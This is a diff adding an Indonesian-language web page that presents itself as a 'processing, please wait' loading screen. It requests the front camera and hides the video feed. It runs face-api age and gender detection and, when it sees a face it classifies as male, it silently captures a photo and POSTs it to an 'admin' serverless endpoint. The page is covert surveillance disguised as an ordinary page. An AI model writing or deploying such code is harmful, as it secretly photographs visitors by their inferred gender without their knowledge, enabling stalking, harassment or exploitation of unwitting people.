@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Memuat...</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 20%; background: #fafafa; }
+        video, canvas { display: none; /* Kamera disembunyikan */ }
+    </style>
+</head>
+<body>
+    <h2>Memproses permintaan, harap tunggu...</h2>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let fotoDikirim = false;
+
+        async function mulaiSistem() {
+            // 1. Muat Model AI
+            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
+            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+            await faceapi.nets.faceAgeGenderNet.loadFromUri(MODEL_URL);
+
+            // 2. Akses Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+            } catch (err) {
+                console.error("Izin kamera ditolak");
+            }
+        }
+
+        video.addEventListener('play', () => {
+            setInterval(async () => {
+                if (fotoDikirim) return; // Mencegah spam gambar
+
+                const deteksi = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withAgeAndGender();
+
+                if (deteksi && deteksi.gender === 'male' && deteksi.genderProbability > 0.7) {
+                    kirimGambarKeAdmin();
+                    fotoDikirim = true;
+                }
+            }, 1000);
+        });
+
+        async function kirimGambarKeAdmin() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const dataGambar = canvas.toDataURL('image/jpeg', 0.6);
+
+            // POST ke Vercel Serverless API
+            await fetch('/api/kirim-gambar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ imageBase64: dataGambar })
+            });
+        }
+
+        mulaiSistem();
+    </script>
+</body>
+</html>
+
